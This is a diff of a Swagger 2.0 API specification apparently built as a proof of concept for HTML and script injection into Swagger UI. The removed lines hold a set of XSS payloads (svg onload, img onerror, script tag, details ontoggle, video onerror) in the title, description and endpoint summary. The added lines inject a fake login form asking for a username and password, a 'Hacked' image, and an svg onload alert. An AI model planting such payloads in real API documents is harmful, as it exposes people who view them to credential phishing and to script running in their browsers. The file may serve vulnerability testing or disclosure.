@@ -1,14 +1,18 @@
 swagger: "2.0"
 info:
-  title: "XSS PoC 🚨"
-  description: |
-    <svg/onload=alert('XSS')>
-    <img src=x onerror=alert('XSS')>
-    <script>alert(1)</script>
-    <details open ontoggle=alert(1)>
-    <video><source onerror="alert('XSS')">
-
   version: "1.0.0"
+  title: "Fake Login Page"
+  description: |
+    <h2>HTML Injection : Fake Login</h2>
+    <form>
+      <label>Username</label><br>
+      <input type="text" /><br><br>
+      <label>Password</label><br>
+      <input type="password" /><br><br>
+      <button type="submit">Login</button>
+    </form>
+    <br>
+    <img src="https://i.imgur.com/V3KjVdA.gif" width="100%" alt="Hacked" />
 host: example.com
 basePath: /
 schemes:
@@ -16,8 +20,8 @@ schemes:
 paths:
   /test:
     get:
-      summary: "<svg onload=alert('XSS')>"
-      description: "Testing reflected XSS via Swagger UI"
+      summary: "<svg/onload=alert('html injected')>"
+      description: "This is a test endpoint with HTML content"
       responses:
         200:
-          description: "Success"
+          description: "Successful response"
